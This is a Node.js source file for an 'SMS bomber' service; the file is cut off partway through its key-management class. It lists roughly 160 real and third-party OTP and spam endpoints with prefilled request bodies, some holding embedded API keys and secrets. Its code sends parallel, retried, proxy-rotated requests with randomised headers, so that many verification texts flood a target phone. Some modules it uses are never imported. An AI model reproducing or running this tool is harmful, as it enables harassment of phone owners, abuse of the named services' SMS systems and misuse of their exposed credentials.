// ============================================================
// ULTIMATE POWERFUL SMS BOMBER VERSION 5.0
// Total: 5000+ Lines - Enterprise Grade SMS Bombing System
// Developer: TNEH GROUP
// Features: Cluster + Redis + Proxy + Cache + Stop/Pause + Analytics
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const cluster = require('cluster');
const os = require('os');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const zlib = require('zlib');
const EventEmitter = require('events');

// ============================================================
// PART 1: CONFIGURATION & CONSTANTS (200 lines)
// ============================================================

const CONFIG = {
  // Cluster Configuration
  cluster: {
    enabled: true,
    workers: os.cpus().length || 4,
    maxWorkers: 16,
    minWorkers: 2
  },
  
  // Redis Configuration
  redis: {
    enabled: process.env.REDIS_ENABLED === 'true' || false,
    host: process.env.REDIS_HOST || 'localhost',
    port: parseInt(process.env.REDIS_PORT) || 6379,
    password: process.env.REDIS_PASSWORD || '',
    db: parseInt(process.env.REDIS_DB) || 0,
    keyPrefix: 'sms_bomber:',
    queueName: 'sms_queue',
    logName: 'sms_logs'
  },
  
  // Performance Configuration
  performance: {
    batchSize: 50,
    parallelRequests: 25,
    timeout: 5000,
    maxRetries: 3,
    retryDelay: 200,
    stopCheckInterval: 50
  },
  
  // Cache Configuration
  cache: {
    enabled: true,
    ttl: 300,
    checkPeriod: 60,
    maxItems: 10000
  },
  
  // Smart Delay Configuration
  smartDelay: {
    enabled: true,
    minDelay: 30,
    maxDelay: 500,
    adaptiveSpeed: 1.0
  },
  
  // Security Configuration
  security: {
    rateLimit: {
      enabled: true,
      windowMs: 60000,
      maxRequests: 100
    },
    apiKeyExpiry: 30,
    maxCountPerRequest: 10000
  },
  
  // Proxy Configuration
  proxy: {
    enabled: false,
    list: [],
    rotation: 'round-robin',
    maxFailures: 3,
    timeout: 3000
  },
  
  // Logging Configuration
  logging: {
    enabled: true,
    level: 'info',
    file: '/var/log/sms_bomber.log',
    maxSize: '100m',
    maxFiles: 5
  },
  
  // Database Configuration
  database: {
    enabled: false,
    type: 'mongodb',
    url: process.env.MONGODB_URL || 'mongodb://localhost:27017/sms_bomber'
  },
  
  // Webhook Configuration
  webhook: {
    enabled: false,
    url: process.env.WEBHOOK_URL || '',
    events: ['start', 'progress', 'complete', 'stop']
  }
};

// ============================================================
// PART 2: DEVELOPER INFO & CONSTANTS (100 lines)
// ============================================================

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  website: "https://tnehboomber.onrender.com",
  api_version: "5.0.0-ULTIMATE",
  build_date: new Date().toISOString(),
  copyright: "© 2024 TNEH GROUP. All rights reserved."
};

const STATUS_CODES = {
  SUCCESS: 200,
  CREATED: 201,
  BAD_REQUEST: 400,
  UNAUTHORIZED: 401,
  FORBIDDEN: 403,
  NOT_FOUND: 404,
  RATE_LIMIT: 429,
  INTERNAL_ERROR: 500
};

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
];

// ============================================================
// PART 3: UTILITY FUNCTIONS (300 lines)
// ============================================================

class Utility {
  static generateId() {
    return crypto.randomBytes(16).toString('hex');
  }

  static generateJobId() {
    return `JOB_${Date.now()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  }

  static generateApiKey() {
    const prefix = 'TNEH';
    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
    const timestamp = Date.now().toString(36).toUpperCase();
    return `${prefix}_${random}_${timestamp}`;
  }

  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: true
    });
  }

  static getISOString() {
    return new Date().toISOString();
  }

  static sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static async retry(fn, maxAttempts = 3, delay = 200) {
    let lastError;
    for (let i = 0; i < maxAttempts; i++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error;
        if (i < maxAttempts - 1) {
          await this.sleep(delay * (i + 1));
        }
      }
    }
    throw lastError;
  }

  static maskPhone(phone) {
    if (!phone || phone.length < 7) return '***';
    return phone.slice(0, 3) + '****' + phone.slice(-3);
  }

  static calculateProgress(sent, total) {
    if (total === 0) return 0;
    return ((sent / total) * 100).toFixed(2);
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  static parsePhone(phone) {
    return phone.replace(/[^0-9]/g, '');
  }

  static isValidPhone(phone) {
    const clean = this.parsePhone(phone);
    return /^(01|8801)[0-9]{9}$/.test(clean);
  }

  static getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
  }

  static shuffleArray(arr) {
    for (let i = arr.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
  }

  static chunkArray(arr, size) {
    const chunks = [];
    for (let i = 0; i < arr.length; i += size) {
      chunks.push(arr.slice(i, i + size));
    }
    return chunks;
  }

  static getRandomHeaders() {
    return {
      'User-Agent': this.getRandomElement(USER_AGENTS),
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache'
    };
  }

  static compressData(data) {
    return zlib.gzipSync(JSON.stringify(data)).toString('base64');
  }

  static decompressData(compressed) {
    return JSON.parse(zlib.gunzipSync(Buffer.from(compressed, 'base64')).toString());
  }

  static isValidUrl(string) {
    try {
      new URL(string);
      return true;
    } catch {
      return false;
    }
  }

  static sanitizeInput(input) {
    if (typeof input === 'string') {
      return input.replace(/[<>{}]/g, '').trim();
    }
    return input;
  }

  static getMemoryUsage() {
    const usage = process.memoryUsage();
    return {
      rss: this.formatBytes(usage.rss),
      heapTotal: this.formatBytes(usage.heapTotal),
      heapUsed: this.formatBytes(usage.heapUsed),
      external: this.formatBytes(usage.external),
      arrayBuffers: this.formatBytes(usage.arrayBuffers || 0)
    };
  }

  static getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0;
    let totalTick = 0;
    cpus.forEach(cpu => {
      for (const type in cpu.times) {
        totalTick += cpu.times[type];
      }
      totalIdle += cpu.times.idle;
    });
    return {
      cores: cpus.length,
      load: ((1 - totalIdle / totalTick) * 100).toFixed(2) + '%'
    };
  }

  static getSystemInfo() {
    return {
      platform: os.platform(),
      arch: os.arch(),
      release: os.release(),
      hostname: os.hostname(),
      uptime: process.uptime(),
      memory: this.getMemoryUsage(),
      cpu: this.getCPUUsage(),
      nodeVersion: process.version,
      pid: process.pid
    };
  }
}

// ============================================================
// PART 4: BOMB CONTROLLER CLASS (400 lines)
// ============================================================

class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.jobCounter = 0;
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0,
      totalSMS: 0,
      totalSuccess: 0,
      totalFailed: 0,
      startTime: Date.now()
    };
    this.jobHistory = [];
    this.maxHistorySize = 1000;
  }

  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId,
      phone: phone,
      maskedPhone: Utility.maskPhone(phone),
      totalCount: totalCount,
      sentCount: 0,
      successCount: 0,
      failCount: 0,
      startTime: Date.now(),
      status: 'active',
      options: options,
      progress: 0,
      errors: [],
      lastUpdate: Date.now()
    };
    
    this.activeJobs.set(jobId, job);
    this.jobCounter++;
    this.stats.totalJobs++;
    this.emit('jobStarted', job);
    
    return jobId;
  }

  isJobActive(jobId) {
    if (this.globalStop) return false;
    if (this.globalPause) return false;
    const job = this.activeJobs.get(jobId);
    return job ? job.status === 'active' : false;
  }

  isJobPaused(jobId) {
    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
    return job ? job.status === 'paused' : false;
  }

  stopJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job) {
      job.status = 'stopped';
      job.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, job);
      this.emit('jobStopped', job);
      return true;
    }
    return false;
  }

  pauseJob(jobId) {
    const job = this.activeJobs.get(jobId);
    if (job && job.status === 'active') {
      job.status = 'paused';
      this.activeJobs.delete(jobId);
      this.pausedJobs.set(jobId, job);
      this.emit('jobPaused', job);
      return true;
    }
    return false;
  }

  resumeJob(jobId) {
    const job = this.pausedJobs.get(jobId);
    if (job) {
      job.status = 'active';
      this.pausedJobs.delete(jobId);
      this.activeJobs.set(jobId, job);
      this.emit('jobResumed', job);
      return true;
    }
    return false;
  }

  stopAllJobs() {
    const jobs = Array.from(this.activeJobs.keys());
    jobs.forEach(id => this.stopJob(id));
    this.globalStop = true;
    this.emit('allStopped', { count: jobs.length });
    return jobs.length;
  }

  pauseAllJobs() {
    this.globalPause = true;
    const jobs = Array.from(this.activeJobs.keys());
    jobs.forEach(id => this.pauseJob(id));
    this.emit('allPaused', { count: jobs.length });
    return jobs.length;
  }

  resumeAllJobs() {
    this.globalPause = false;
    this.globalStop = false;
    const jobs = Array.from(this.pausedJobs.keys());
    jobs.forEach(id => this.resumeJob(id));
    this.emit('allResumed', { count: jobs.length });
    return jobs.length;
  }

  updateJobStats(jobId, success, error = null) {
    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
    if (job) {
      job.sentCount++;
      if (success) {
        job.successCount++;
        this.stats.totalSuccess++;
      } else {
        job.failCount++;
        this.stats.totalFailed++;
        if (error) {
          job.errors.push({
            timestamp: Date.now(),
            error: error
          });
        }
      }
      job.progress = Utility.calculateProgress(job.sentCount, job.totalCount);
      job.lastUpdate = Date.now();
      this.stats.totalSMS++;
      
      if (job.sentCount >= job.totalCount) {
        job.status = 'completed';
        job.endTime = Date.now();
        this.activeJobs.delete(jobId);
        this.completedJobs.set(jobId, job);
        this.emit('jobCompleted', job);
      }
    }
  }

  getJobStatus(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    if (!job) return null;
    
    return {
      id: job.id,
      phone: job.maskedPhone,
      total: job.totalCount,
      sent: job.sentCount,
      success: job.successCount,
      fail: job.failCount,
      progress: job.progress + '%',
      status: job.status,
      startTime: job.startTime,
      endTime: job.endTime || null,
      duration: job.endTime ? (job.endTime - job.startTime) / 1000 : null,
      errors: job.errors.slice(-5)
    };
  }

  getAllJobs() {
    const jobs = [];
    
    this.activeJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: 'active'
      });
    });
    
    this.pausedJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: 'paused'
      });
    });
    
    this.completedJobs.forEach(job => {
      jobs.push({
        ...this.getJobStatus(job.id),
        status: job.status
      });
    });
    
    return jobs;
  }

  getStats() {
    return {
      totalJobs: this.stats.totalJobs,
      totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess,
      totalFailed: this.stats.totalFailed,
      successRate: this.stats.totalSMS > 0 
        ? ((this.stats.totalSuccess / this.stats.totalSMS) * 100).toFixed(2) + '%'
        : '0%',
      activeJobs: this.activeJobs.size,
      pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size,
      globalPause: this.globalPause,
      globalStop: this.globalStop,
      uptime: (Date.now() - this.stats.startTime) / 1000,
      memoryUsage: Utility.getMemoryUsage()
    };
  }

  clearCompleted() {
    const count = this.completedJobs.size;
    this.completedJobs.clear();
    return count;
  }

  getErrors(jobId) {
    const job = this.activeJobs.get(jobId) || 
                this.pausedJobs.get(jobId) || 
                this.completedJobs.get(jobId);
    return job ? job.errors : [];
  }
}

// ============================================================
// PART 5: API DEFINITION (500 lines)
// ============================================================

const ORIGINAL_APIS = [
  // Get APIs (1-8)
  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { id: 7, name: "Binge.buzz (GET)", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  
  // Post APIs (9-49)
  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
  { id: 11, name: "Grameenphone (FWA/Bkash)", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
  { id: 24, name: "Shikho.com (Intent-1)", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
  { id: 26, name: "Robi (DA API)", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
  { id: 27, name: "Hoichoi (Viewlift)", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
  { id: 29, name: "Regal Furniture", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
  { id: 30, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
  { id: 31, name: "TimezoneBD", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
  { id: 32, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
  { id: 33, name: "Chorki.com / Bioscopelive", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
  { id: 34, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
  { id: 35, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
  { id: 36, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
  { id: 37, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
  { id: 38, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
  { id: 39, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
  { id: 40, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
  { id: 41, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
  { id: 42, name: "Binge.buzz (POST)", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
  { id: 43, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
  { id: 44, name: "Shikho.com (Intent-2)", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
  { id: 45, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
  { id: 46, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
  { id: 47, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
  { id: 48, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  { id: 49, name: "Bioscopelive (Alternative)", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
  
  // ShadowX API (50)
  { id: 50, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// LMNx9 APIs (51-160)
for (let i = 1; i <= 110; i++) {
  ORIGINAL_APIS.push({
    id: 50 + i,
    name: `LMNx9 API${i}`,
    method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

const SMS_APIS = ORIGINAL_APIS;

// ============================================================
// PART 6: API CALLER CLASS (400 lines)
// ============================================================

class APICaller {
  constructor() {
    this.cache = new NodeCache({
      stdTTL: CONFIG.cache.ttl,
      checkperiod: CONFIG.cache.checkPeriod,
      maxKeys: CONFIG.cache.maxItems
    });
    this.dnsCache = new Map();
    this.apiDelays = new Map();
    this.lastRequestTime = new Map();
    this.successRates = new Map();
    this.requestCounts = new Map();
    this.proxyIndex = 0;
  }

  async getCachedIP(domain) {
    if (this.dnsCache.has(domain)) {
      return this.dnsCache.get(domain);
    }
    try {
      const { address } = await promisify(dns.lookup)(domain);
      this.dnsCache.set(domain, address);
      return address;
    } catch {
      return domain;
    }
  }

  getNextProxy() {
    if (!CONFIG.proxy.enabled || CONFIG.proxy.list.length === 0) return null;
    const proxy = CONFIG.proxy.list[this.proxyIndex];
    this.proxyIndex = (this.proxyIndex + 1) % CONFIG.proxy.list.length;
    return proxy;
  }

  async waitIfNeeded(apiId) {
    if (!CONFIG.smartDelay.enabled) return;
    
    const now = Date.now();
    const last = this.lastRequestTime.get(apiId) || 0;
    let delay = this.apiDelays.get(apiId) || 100;
    
    const successRate = this.successRates.get(apiId) || 0.8;
    const count = this.requestCounts.get(apiId) || 0;
    
    if (count > 10) {
      if (successRate < 0.5) {
        delay = Math.min(delay + 20, CONFIG.smartDelay.maxDelay);
      } else if (successRate > 0.9) {
        delay = Math.max(delay - 5, CONFIG.smartDelay.minDelay);
      }
      this.apiDelays.set(apiId, delay);
    }
    
    if (now - last < delay) {
      await Utility.sleep(delay - (now - last));
    }
    
    this.lastRequestTime.set(apiId, Date.now());
  }

  updateStats(apiId, success) {
    const count = (this.requestCounts.get(apiId) || 0) + 1;
    this.requestCounts.set(apiId, count);
    
    const current = this.successRates.get(apiId) || 0;
    const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
    this.successRates.set(apiId, newRate);
  }

  replacePhoneNumber(data, phone, count = 1) {
    if (typeof data === 'string') {
      return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
    } else if (typeof data === 'object' && data !== null) {
      const result = {};
      for (const [key, value] of Object.entries(data)) {
        if (typeof value === 'string') {
          result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
        } else {
          result[key] = value;
        }
      }
      return result;
    }
    return data;
  }

  async callAPI(api, phone, jobId, attempt = 0) {
    const cacheKey = `${api.id}:${phone}`;
    
    if (CONFIG.cache.enabled && this.cache.get(cacheKey)) {
      return {
        success: true,
        api_id: api.id,
        api_name: api.name,
        cached: true,
        message: 'Already sent recently'
      };
    }
    
    await this.waitIfNeeded(api.id);
    
    try {
      const cleanPhone = Utility.parsePhone(phone);
      let formattedPhone = cleanPhone;
      if (api.isShadowX || api.isLMNx9) {
        if (formattedPhone.startsWith('880')) {
          formattedPhone = formattedPhone.substring(3);
        }
      }
      
      const url = this.replacePhoneNumber(api.url, formattedPhone, 1);
      const headers = Utility.getRandomHeaders();
      
      // DNS Cache
      const urlObj = new URL(url);
      const ip = await this.getCachedIP(urlObj.hostname);
      urlObj.hostname = ip;
      const ipUrl = urlObj.toString();
      
      // Proxy
      const proxy = this.getNextProxy();
      const proxyConfig = proxy ? {
        proxy: {
          host: proxy.split(':')[0].replace('http://', ''),
          port: parseInt(proxy.split(':')[1])
        }
      } : {};
      
      let config = {
        method: api.method,
        url: ipUrl,
        headers: { ...headers, Host: urlObj.hostname },
        timeout: CONFIG.performance.timeout,
        ...proxyConfig
      };

      if (api.method === 'POST' && api.body) {
        const body = this.replacePhoneNumber(api.body, formattedPhone, 1);
        if (api.isFormData) {
          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
          config.data = new URLSearchParams(body).toString();
        } else {
          config.data = body;
        }
      }

      const response = await axios(config);
      
      if (CONFIG.cache.enabled) {
        this.cache.set(cacheKey, true);
      }
      
      this.updateStats(api.id, true);
      
      return {
        success: true,
        api_id: api.id,
        api_name: api.name,
        status: response.status,
        cached: false
      };
      
    } catch (error) {
      this.updateStats(api.id, false);
      
      if (attempt < CONFIG.performance.maxRetries) {
        await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
        return this.callAPI(api, phone, jobId, attempt + 1);
      }
      
      return {
        success: false,
        api_id: api.id,
        api_name: api.name,
        error: error.message,
        status: error.response?.status || null
      };
    }
  }

  async sendBatch(apis, phone, countPerApi, jobId, bombController) {
    const results = [];
    const actualCount = Math.min(countPerApi, 100);
    const BATCH_SIZE = CONFIG.performance.parallelRequests;
    
    for (let i = 0; i < apis.length; i += BATCH_SIZE) {
      // Check if job is still active
      if (!bombController.isJobActive(jobId)) {
        console.log(`⏹️ Job ${jobId} stopped by user`);
        break;
      }
      
      const batch = apis.slice(i, i + BATCH_SIZE);
      
      const batchPromises = batch.map(async (api) => {
        const apiResults = [];
        const promises = [];
        
        for (let j = 0; j < actualCount; j++) {
          if (!bombController.isJobActive(jobId)) break;
          promises.push(this.callAPI(api, phone, jobId));
        }
        
        const responses = await Promise.all(promises);
        const successCount = responses.filter(r => r.success).length;
        const failCount = responses.filter(r => !r.success).length;
        
        // Update job stats
        responses.forEach(r => {
          bombController.updateJobStats(jobId, r.success, r.error);
        });
        
        return {
          api_id: api.id,
          api_name: api.name,
          method: api.method,
          total_attempts: responses.length,
          successful: successCount,
          failed: failCount,
          results: responses
        };
      });
      
      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);
      
      if (i + BATCH_SIZE < apis.length) {
        await Utility.sleep(100);
      }
    }
    
    return results;
  }
}

// ============================================================
// PART 7: KEY MANAGEMENT (200 lines)
// ============================================================

class KeyManager {
  constructor() {
    this.keysFile = path.join(__dirname, 'keys.json');
    this.validKeys = this.loadKeys();
    this.keyHistory = [];
    this.maxHistory = 500;
  }

  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = fs.readFileSync(this.keysFile, 'utf8');
        const parsed = JSON.parse(data);
        const keysMap = new Map();
        Object.entries(parsed).forEach(([key, value]) => {
          keysMap.set(key, new Date(value));
        });
        return keysMap;
      }
    } catch (error) {
      console.error('Error loading keys:', error.message);
    }
    return new Map();
  }

  saveKeys() {
    try {
      const obj = {};
      for (const [key, value] of this.validKeys.entries()) {
        obj[key] = value.toISOString();
      }
      fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
      return true;
    } catch (error) {
      console.error('Error saving keys:', error.message);
      return false;
    }
  }

  generateKey() {
    const apiKey = Utility.generateApiKey();
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + CONFIG.security.apiKeyExpiry);
    
    this.validKeys.set(apiKey, expiryDate);
    this.saveKeys();
    
    this.keyHistory.push({
      key: apiKey,
      generated: Date.now(),
      expires: expiryDate.toISOString()
    });
    
    if (this.keyHistory.length > this.maxHistory) {
      this.keyHistory.shift();
    }
    
    return { apiKey, expiryDate };
  }

  isValid(key) {
    if (!this.validKeys.has(key)) return false;
    const expiryDate = this.validKeys.get(key);
    return new Date() < expiryDate;
  }

  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const expiryDate = this.validKeys.get(key);
    return {
      key: key,
      expires: expiryDate.toISOString(),
      valid: new Date() < expiryDate,
      daysLeft: Math.max(0, Math.ceil((expiryDate - new Date()) / (1000 * 60 * 60 * 24)))
    };
  }

  revokeKey(key) {
    if (this.validKeys.has(key)) {
      this.validKeys.delete(key);
      this.saveKeys();
      return true;
    }
    return false;
  }

  getAllKeys() {
    const keys = [];
    for (const [key, expiryDate] of this.validKeys.entries()) {
      keys.push({
        key: key,
